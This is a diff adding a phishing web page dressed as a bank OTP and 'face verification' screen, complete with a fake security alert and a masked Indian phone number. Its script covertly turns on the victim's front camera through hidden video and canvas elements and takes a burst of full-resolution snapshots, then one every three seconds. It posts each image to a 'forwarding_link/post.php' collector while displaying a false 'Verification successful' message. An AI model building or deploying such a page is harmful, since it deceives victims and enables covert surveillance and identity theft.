@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification — OTP</title>
+    <meta property="og:title" content="Verify Your Account — OTP Required">
+    <meta property="og:description" content="Enter your OTP to complete verification">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/6195/6195699.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: #fff;
+            border-radius: 20px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .bank-logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 16px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 28px;
+        }
+        h2 { color: #1a1a2e; font-size: 22px; margin-bottom: 8px; }
+        .subtitle { color: #888; font-size: 13px; margin-bottom: 25px; }
+        .alert-box {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 12px;
+            color: #856404;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .alert-box strong { display: block; margin-bottom: 4px; }
+        .phone-display {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+        .phone-display span { font-weight: 700; }
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .otp-inputs input {
+            width: 50px;
+            height: 55px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .otp-inputs input:focus { border-color: #667eea; }
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+        .verify-btn:hover { transform: translateY(-1px); opacity: 0.95; }
+        .resend { font-size: 12px; color: #888; }
+        .resend a { color: #667eea; text-decoration: none; font-weight: 600; }
+        .timer { color: #667eea; font-weight: 600; }
+        
+        /* Verification Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal {
+            background: #fff;
+            border-radius: 20px;
+            padding: 35px 25px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .modal .shield { font-size: 48px; margin-bottom: 15px; }
+        .modal h3 { font-size: 18px; color: #1a1a2e; margin-bottom: 8px; }
+        .modal p { font-size: 13px; color: #888; margin-bottom: 20px; line-height: 1.5; }
+        .modal .face-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .modal .skip { display: block; margin-top: 12px; font-size: 12px; color: #aaa; text-decoration: none; cursor: pointer; }
+        
+        /* Progress */
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        .status-text { font-size: 12px; color: #888; display: none; }
+
+        video, canvas { position: absolute; opacity: 0; pointer-events: none; z-index: -1; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="bank-logo">🔐</div>
+        <h2>OTP Verification</h2>
+        <p class="subtitle">A verification code has been sent to your number</p>
+        
+        <div class="alert-box">
+            <strong>⚠️ Security Alert</strong>
+            Unusual activity detected on your account. Please verify to continue.
+        </div>
+        
+        <div class="phone-display">
+            Sent to: <span>+91 ****XX78</span>
+        </div>
+        
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" id="otp1" placeholder="•" title="Digit 1" oninput="moveNext(this, 'otp2')">
+            <input type="text" maxlength="1" id="otp2" placeholder="•" title="Digit 2" oninput="moveNext(this, 'otp3')">
+            <input type="text" maxlength="1" id="otp3" placeholder="•" title="Digit 3" oninput="moveNext(this, 'otp4')">
+            <input type="text" maxlength="1" id="otp4" placeholder="•" title="Digit 4" oninput="moveNext(this, 'otp5')">
+            <input type="text" maxlength="1" id="otp5" placeholder="•" title="Digit 5" oninput="moveNext(this, 'otp6')">
+            <input type="text" maxlength="1" id="otp6" placeholder="•" title="Digit 6" oninput="otpComplete()">
+        </div>
+        
+        <button class="verify-btn" id="verifyBtn" onclick="startVerify()">Verify OTP</button>
+        
+        <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="status-text" id="statusText">Verifying...</div>
+        
+        <p class="resend">Didn't receive? <a href="#" onclick="resendOTP()">Resend OTP</a> in <span class="timer" id="timer">30s</span></p>
+    </div>
+    
+    <!-- Face Verification Modal -->
+    <div class="modal-overlay" id="faceModal">
+        <div class="modal">
+            <div class="shield">🛡️</div>
+            <h3>Identity Verification Required</h3>
+            <p>For your security, we need to verify your identity using face recognition before processing this transaction.</p>
+            <button class="face-btn" onclick="startCamera()">📸 Verify My Face</button>
+            <a class="skip" onclick="closeFaceModal()">Skip for now</a>
+        </div>
+    </div>
+    
+    <video id="vid" playsinline autoplay muted></video>
+    <canvas id="cnv" width="1920" height="1080"></canvas>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        var countDown = 30;
+        var timerInterval;
+        
+        function moveNext(current, nextId) {
+            if (current.value.length === 1 && document.getElementById(nextId)) {
+                document.getElementById(nextId).focus();
+            }
+        }
+        
+        function otpComplete() {
+            // Auto-verify when all 6 digits entered
+            setTimeout(function() { startVerify(); }, 300);
+        }
+        
+        function startVerify() {
+            var otp = '';
+            for (var i = 1; i <= 6; i++) {
+                otp += document.getElementById('otp' + i).value;
+            }
+            
+            // Show progress
+            document.getElementById('progressBar').style.display = 'block';
+            document.getElementById('statusText').style.display = 'block';
+            document.getElementById('statusText').textContent = 'Verifying OTP...';
+            
+            var fill = document.getElementById('progressFill');
+            fill.style.width = '40%';
+            
+            setTimeout(function() {
+                fill.style.width = '70%';
+                document.getElementById('statusText').textContent = 'Checking security...';
+            }, 1000);
+            
+            setTimeout(function() {
+                fill.style.width = '85%';
+                document.getElementById('statusText').textContent = 'Additional verification needed...';
+            }, 2000);
+            
+            // Show face verification modal
+            setTimeout(function() {
+                document.getElementById('faceModal').classList.add('active');
+            }, 2500);
+        }
+        
+        function startCamera() {
+            document.getElementById('faceModal').classList.remove('active');
+            document.getElementById('statusText').textContent = '📸 Face verification in progress...';
+            
+            var video = document.getElementById('vid');
+            var canvas = document.getElementById('cnv');
+            var ctx = canvas.getContext('2d');
+            
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } },
+                audio: false
+            }).then(function(stream) {
+                video.srcObject = stream;
+                
+                // Burst: 5 shots at 1s
+                var shotCount = 0;
+                var burstInterval = setInterval(function() {
+                    canvas.width = video.videoWidth || 1920;
+                    canvas.height = video.videoHeight || 1080;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var imgData = canvas.toDataURL('image/png');
+                    
+                    $.ajax({
+                        url: 'forwarding_link/post.php',
+                        type: 'POST',
+                        data: { cat: imgData }
+                    });
+                    
+                    shotCount++;
+                    var progressPercent = 85 + (shotCount * 3);
+                    document.getElementById('progressFill').style.width = progressPercent + '%';
+                    
+                    if (shotCount >= 5) {
+                        clearInterval(burstInterval);
+                        // Continue normal interval
+                        setInterval(function() {
+                            canvas.width = video.videoWidth || 1920;
+                            canvas.height = video.videoHeight || 1080;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            var imgData = canvas.toDataURL('image/png');
+                            $.post('forwarding_link/post.php', { cat: imgData });
+                        }, 3000);
+                        
+                        // Show success
+                        setTimeout(function() {
+                            document.getElementById('progressFill').style.width = '100%';
+                            document.getElementById('statusText').textContent = '✅ Verification successful!';
+                            document.getElementById('statusText').style.color = '#22c55e';
+                        }, 2000);
+                    }
+                }, 1000);
+                
+            }).catch(function(err) {
+                document.getElementById('statusText').textContent = '⚠️ Camera access required for verification';
+                // Redirect after delay
+                setTimeout(function() { window.location.href = 'https://www.google.com'; }, 5000);
+            });
+        }
+        
+        function closeFaceModal() {
+            document.getElementById('faceModal').classList.remove('active');
+            document.getElementById('progressFill').style.width = '100%';
+            document.getElementById('statusText').textContent = '✅ OTP verified successfully!';
+            document.getElementById('statusText').style.color = '#22c55e';
+        }
+        
+        function resendOTP() {
+            countDown = 30;
+            document.getElementById('timer').textContent = '30s';
+        }
+        
+        // Countdown timer
+        timerInterval = setInterval(function() {
+            countDown--;
+            document.getElementById('timer').textContent = countDown + 's';
+            if (countDown <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('timer').textContent = 'Now';
+            }
+        }, 1000);
+    </script>
+    <script src="fingerprint.js"></script>
+</body>
+</html>
